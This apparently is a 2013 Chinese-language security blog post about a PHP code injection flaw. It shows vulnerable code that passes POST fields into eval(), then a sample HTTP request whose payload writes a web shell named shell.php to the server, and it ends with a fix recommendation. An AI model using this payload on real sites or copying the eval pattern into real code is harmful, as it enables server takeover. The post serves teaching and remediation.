---
layout: post
title: "PHP代码注入漏洞"
description: "php code injection"
category: web
tags: [websecurity]
published: true
comments: true
date: 2013-05-13 18:05:37 +0800
---
{% include JB/setup %}

### 前言

在做测试的过程中，居然还发现了一站点现在还存在PHP代码注入的漏洞，真是很难见到的漏洞。现在说说这个漏洞产生的原因以及利用和修复方法吧。

### 漏洞成因

下面的代码片段引入了PHP代码注入漏洞，

```php
<?
$postarray = array(
"name",
"email",
"message",
);
foreach ($postarray as $val) {
	if (!isset($_POST[$val])) $_POST[$val] = "";
	eval("$".$val." = '".$_POST[$val]."';");
}
?>
```

<!--more-->

代码本意是想通过使用eval来给变量赋值，只是没有对用户提交的内容进行过滤。

### 漏洞利用

利用很简单了，既然可以执行任何php代码，只需在提交时加入恶意代码就可以。下面是一个示例。

```text
POST /test.php HTTP/1.1
Content-Length: 89
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=ui7uokv6ac1tdf2bh78fasdc55
Host: www.xxxx.xxx
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
Accept: */*

name=&&email=';fputs(fopen("shell.php","w+"),"<?eval(\$_POST[cmd]);?>");%24a%3d'&message=
```

### 修补建议

**尽量不要使用eval等高危函数，如果要使用，一定要确保函数参数可控**，就本例来说，可以直接赋值。
